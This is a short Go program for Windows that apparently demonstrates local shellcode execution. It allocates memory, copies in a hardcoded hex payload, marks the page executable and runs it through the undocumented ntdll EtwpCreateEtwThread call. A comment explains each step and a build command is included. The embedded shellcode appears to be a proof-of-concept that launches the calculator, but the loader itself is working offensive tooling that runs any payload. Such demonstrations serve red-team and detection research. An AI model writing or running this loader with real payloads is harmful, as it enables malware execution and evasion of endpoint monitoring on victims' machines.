// +build windows

/*
This program executes shellcode in the current process using the following steps
	1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
	2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
	3. Change the memory page permissions to Execute/Read with VirtualProtect
	4. Call EtwpCreateEtwThread on shellcode address
	5. Call WaitForSingleObject so the program does not end before the shellcode is executed

This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
*/

// Demonstrates using ntdll.dll!EtwpCreateThreadEtw for local shellcode execution: https://gist.github.com/TheWover/b2b2e427d3a81659942f4e8b9a978dc3
package main

import (
	"log"

	sc "github.com/cauefcr/go-shellcode"
)

func main() {
	err := sc.RunSCcreateETWthread("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3", 2)
	if err != nil {
		log.Panic(err)
	}
}

// export GOOS=windows GOARCH=amd64;go build -o goEtwpCreateEtwThread.exe cmd/EtwpCreateEtwThread/main.go
